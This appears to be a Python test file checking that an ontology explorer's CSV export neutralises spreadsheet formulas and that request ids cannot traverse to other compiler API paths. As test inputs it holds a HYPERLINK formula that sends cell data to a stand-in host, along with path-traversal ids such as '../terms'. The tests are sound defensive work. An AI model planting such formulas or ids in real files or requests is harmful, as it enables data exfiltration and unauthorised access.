"""The Ontology explorer's server side without the compiler binary: the CSV export is safe to open in a spreadsheet,
and ids from a request cannot steer Cairn's calls to the compiler to another of its endpoints."""

import csv
import io

import httpx
import pytest

from cairn.context.ontology_compiler import OntologyClient, OntologyCompiler, OntologyError
from cairn.context.ontology_explorer import OntologyExplorer

T = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.orders,PROD)"
U = "urn:li:dataset:(urn:li:dataPlatform:trino,lake.retail.customers,PROD)"


class _View:
    def __init__(self, v):
        self.v = v

    def view(self, can_view):
        return OntologyCompiler.visible(self.v, can_view)


def test_csv_export_neutralises_spreadsheet_formulas():
    evil = '=HYPERLINK("http://x.example/?"&A1,"open")'
    v = {"run_id": "r", "version": 1, "tables": [{"table_id": T}, {"table_id": U}],
         "terms": [{"id": "t1", "name": "+Order", "table_id": T, "table_name": "orders", "description": evil,
                    "provenance": [{"source": "model", "confidence": 0.9}]}],
         "attributes": [{"id": "a1", "name": "@total", "table_id": T, "column": "-amount", "term_id": "t1",
                         "description": "\t=1+1"}],
         "relationships": [{"id": "r1", "source_table": T, "target_table": U, "source_column": "=cid",
                            "target_column": "id", "cardinality": "many_to_one", "confidence": 0.8,
                            "rationale": "-2+3"}],
         "metrics": [{"id": "m1", "name": "=SUM(1)", "tables": [T], "source": "query", "description": "@x"}],
         "bridges": []}
    out = OntologyExplorer(_View(v)).csv(lambda urn: True)
    rows = list(csv.reader(io.StringIO(out)))
    cells = [c for row in rows[1:] for c in row]
    assert not [c for c in cells if c[:1] in ("=", "+", "-", "@", "\t", "\r")], cells
    assert "'" + evil in cells and "'+Order" in cells       # kept, readable, but text
    assert any(c == "0.9" for c in cells)                   # numbers stay numbers


def _client(seen: list[str]) -> OntologyClient:
    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req.url.raw_path.decode())
        if req.url.path == "/v1/terms":     # every term of every dataset: must never be reached this way
            return httpx.Response(200, json={"version": 1, "terms": [{"term": {"name": "Secret"}}]})
        return httpx.Response(404, json={"error": "no such element"})
    return OntologyClient("http://compiler", "t" * 32, http=httpx.Client(transport=httpx.MockTransport(handler)))


@pytest.mark.parametrize("kind,eid", [("..", "terms"), (".", "../terms"), ("term", "x?y=1"), ("term", "a/../../terms")])
def test_provenance_ids_stay_in_their_path_segment(kind, eid):
    seen: list[str] = []
    c = _client(seen)
    with pytest.raises(OntologyError) as e:
        c.provenance(kind, eid)
    assert e.value.status == 404
    assert all(p.startswith("/v1/provenance/") and p.count("/") == 4 for p in seen), seen


@pytest.mark.parametrize("rid", ["..", ".", "x?a=b", "../terms"])
def test_run_ids_stay_in_their_path_segment(rid):
    seen: list[str] = []
    c = _client(seen)
    for call in (c.run, c.cancel, c.resume):
        with pytest.raises(OntologyError):
            call(rid)
    assert all(p.startswith("/v1/runs/") and "/v1/terms" not in p for p in seen), seen
